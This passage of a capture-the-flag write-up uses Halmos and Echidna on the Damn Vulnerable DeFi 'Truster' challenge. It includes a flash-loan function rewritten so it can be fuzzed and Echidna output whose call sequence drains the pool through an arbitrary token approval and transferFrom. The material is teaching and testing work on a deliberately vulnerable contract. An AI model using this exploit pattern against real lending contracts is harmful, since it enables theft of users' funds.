        revert RepayFailed();
    }
    return true;
}
```
Of course, it doesn't compile:
```javascript
$ forge build
...
Error: Compiler run failed:
Error: Compiler error (/solidity/libsolidity/codegen/LValue.cpp:51):Stack too deep. ...
...
```
But we can rewrite it using the same idea. **permit** and **flashLoan** calls are deleted because they are uncallable anyway:
```solidity
function __flashLoan(uint256 amount, address borrower,
		    bool is_approve, bool is_transfer, bool is_tranferFrom,
		    address addr_param1, address addr_param2,
		    uint256 uint256_param1
		    )
	external
	nonReentrant
	returns (bool)
{
	uint256 balanceBefore = token.balanceOf(address(this));
	
	token.transfer(borrower, amount);
	if (is_approve == true) { // token.approve
	    token.approve(addr_param1, uint256_param1);
	}
	else if (is_transfer == true) { // token.transfer
	    token.transfer(addr_param1, uint256_param1);
	}
	else if (is_tranferFrom == true) { // token.transferFrom
	    token.transferFrom(addr_param1, addr_param2, uint256_param1);
	}
	if (token.balanceOf(address(this)) < balanceBefore) {
	    revert RepayFailed();
	}
	return true;
}
```
Run:
```javascript
$ forge build
...
$ echidna test/truster/TrusterEchidna.sol --contract TrusterEchidna --config test/truster/truster.yaml --test-limit 10000000
...
echidna_testSolved: failed!
  Call sequence:
    TrusterLenderPool.__flashLoan(0,0x0,true,false,false,0xcafe0002,0x0,40464368538165944492706300802628728086193014206184318198474034)
    DamnValuableToken.transferFrom(0x62d69f6867a0a084c6d313943dc22023bc263691,0x0,1)
```
It's alive! Well, with such changes, we managed to make fuzzing produce some kind of acceptable result.
## Conclusions
1. Sometimes, one transaction is not enough for an attack. Symbolically perform 2 transactions in 
such tasks generally possible for Halmos.
2. One of the main conditions for successful preparation of the symbolic test is to make sure that the maximum number of paths is covered. If there is a way to simply increase this number, it should be done!
3. If the target contract needs some changes, don't be afraid to make them. The main thing is to understand what we are doing so as not to affect the result.
4. You have to be careful with cryptographic functions, as automatic tools do not handle them well.
5. Fuzzing in Foundry and Echidna showed itself to be very weak with contracts in which there is a call to the transferred target and the corresponding data. It would seem that it should be simple: take the target from the known ones, build calldata from the selector and the necessary parameters and execute. But these tools did not cope with this. Probably, this is the reason why I did not find any solution to this problem using fuzzing on the Internet. Preparing such a contract for fuzzing looks more like a headache. And here Halmos showed itself as a very convenient tool.
## What's next?
The next article in this series is [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver) solving.
